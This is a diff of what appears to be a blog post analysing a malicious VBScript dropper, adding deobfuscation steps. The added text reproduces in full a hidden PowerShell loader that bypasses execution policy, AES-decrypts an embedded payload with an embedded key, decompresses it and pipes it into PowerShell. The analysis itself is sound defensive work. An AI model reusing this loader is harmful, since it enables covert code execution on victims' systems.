@@ -47,7 +47,7 @@ Close
 
 <br>
 ### 3. Deobfuscation
-
+#### 3.1. Initial Deobfuscation
 We notice that a string is built on the `res` variable.
 
 {% highlight vb %}
@@ -63,7 +63,9 @@ document.write(res)
 {% endhighlight %}
 
 <br>
-Shown below is the value of `res` in plaintext. Long arrays and ShellExecute - looks pretty gnarly.
+Shown below is the value of `res` in plaintext. Long arrays and ShellExecute - pretty gnarly stuff. 
+
+Immediately, `Function Bcd` looks to be a decoder for the Array structures. It subtracts 608 from each element and converts it into an ASCII character. 
 
 {% highlight vb %}
 
@@ -105,3 +107,19 @@ End Function
 qSN() 
 
 {% endhighlight %}
+
+<br>
+#### 3.2. String Decoding
+Decoding the 3 Arrays lead to the following strings
+
+{% highlight powershell %}
+LJD = "powershell.exe"
+
+Set Mdq = RSv("Shell.Application")
+
+thI = "-ExecutionPolicy UnRestricted Start-Process 'cmd.exe' -WindowStyle hidden -ArgumentList {/c powershell.exe $kFxPJ = 'AAAAAAAAAAAAAAAAAAAAAB8rmY4fHpb8hejK0ZE9i3tYaElNq655jsBvUpIJFHOn1uc5lQj4Be1l49TSquzg8V9DHtUtCrMd/ZLvOZ5NkgFprkRf2UaG9yHpdhtrDzpRJGDiCaS6AmKix+hcVPlXfljynDNLwz4PUrjm3/Sdor7db3fiZeqggtYQ1nZJ0PvDTb8X5h9YqnFjlwoBn1Kqm4xRlS9pDC3e+q5LfaEllwYS3fDB0AAwKPI/yMOz7yjrVypnNiMFBhXUZoMSi+ox9DiNjKffZpwKuOM65JPVP0XcrJcV8KOOpJgJcKDG9vZ3CSubCLFKLsH1ELWlT7y5QL+Lps36DYWEc7iGz7awlYrSf3FxZXhqSovpB3kEqmYTwT+0enYQmdQM4zmp9X0yoUyLABk1ulIFxI6fDOZvPS1O9O6xGsN6FJ6s8Xh0XetS4fb5eIriW1xFNMHegsBR5eL0+YgEQ9ne71pyDETQKk/hLReBWPlE6AaFoL4dx2X5xk6SywdWAXt0IqyWxMcfzoeC+M2doGTtH+ySzoe2zTwn/pBoxoT6VNEDWN7BqJzlYePO/iilhYHFXnYicCPFrkhf7U+sx4KSJnwnpriNduHTVgZqGN2s+fWJj2Ayz9CiMpcrftS/QsGaut+yhZ0aCXT1Ps9TSoh2T29HRUUvHgZQwHHWEDNa9A1kClLqHcL97KrH6Q0VtEYwP4lfTHR1ZS/hQVHQD8DMh9XlzLDhRaeA4k1fxNL5teIwXm3Hp1wFSrjnq26JeuFn84v5BdLQTvUsdSfKCboBvZ5gEJLsedpRyze4LwiWOJjhpngo23nbOTgg85YphqZRG9IJRRtkKz0fR/5NT1gLNKm87OzUiwsjaXM+hGSUrkedK02uPjz8IB03lABwRs2rgeWZfjUhV0+Yfm1NI9OQdR3WqaBHaFVTcRzGz1CTDlN6z+aj+Ywe2JQIsO9254VX35INw6kwDs/HXl5wA/jtzff7KEhFRw6kfThU/T2LjTJCa9/CcOrtvdwVY7r0E30QBUwjStxxZbVRSUESZZjJJ6x2MNwBCf69xADLPlMv+jfGQLKTbQNKqDtsVJmnssYMdGWjhu/3kQFiNxOZZWgRyUHnzkluTMjfHe5mNGF7gpIOY60FIEOagfjWTGEnN5ek/HuzKFshcR0q+QfxbZQY00FY9uSTwPLm9lt1y8/rSVYxBTgI2scFzcOnMNnxUSUdfeKwS/lvNqkfM7BeSWkR0JpodtuSyyMh27yHxpYvw3MWI/a/Ll3ZUxsXup1UzN2WT4BN1bDgR3E38mX5z7e3J9werT9vZFPEqyCxSb3qTIceY//xoTGC38N0BrEEp1UK4MmefVRk9Q==';$IGZalW = 'Y0JqV3JldExSbXVlVnJGQVpmQnhMRVJwT3NPbmV6c3I=';$PaDaWJjV = New-Object 'System.Security.Cryptography.AesManaged';$PaDaWJjV.Mode = [System.Security.Cryptography.CipherMode]::ECB;$PaDaWJjV.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$PaDaWJjV.BlockSize = 128;$PaDaWJjV.KeySize = 256;$PaDaWJjV.Key = [System.Convert]::FromBase64String($IGZalW);$rXkyj = [System.Convert]::FromBase64String($kFxPJ);$zwImdOWL = $rXkyj[0..15];$PaDaWJjV.IV = $zwImdOWL;$uLvleqHex = $PaDaWJjV.CreateDecryptor();$ouAYIPjpz = $uLvleqHex.TransformFinalBlock($rXkyj, 16, $rXkyj.Length - 16);$PaDaWJjV.Dispose();$ncTTAn = New-Object System.IO.MemoryStream( , $ouAYIPjpz );$wLOeArZ = New-Object System.IO.MemoryStream;$fkkYLhnOz = New-Object System.IO.Compression.GzipStream $ncTTAn, ([IO.Compression.CompressionMode]::Decompress);$fkkYLhnOz.CopyTo( $wLOeArZ );$fkkYLhnOz.Close();$ncTTAn.Close();[byte[]] $SYdhOjx = $wLOeArZ.ToArray();$qhYxejm = [System.Text.Encoding]::UTF8.GetString($SYdhOjx);$qhYxejm | powershell - }"
+
+{% endhighlight %}
+
+<br>
+#### 3.3. Powershell Analysis
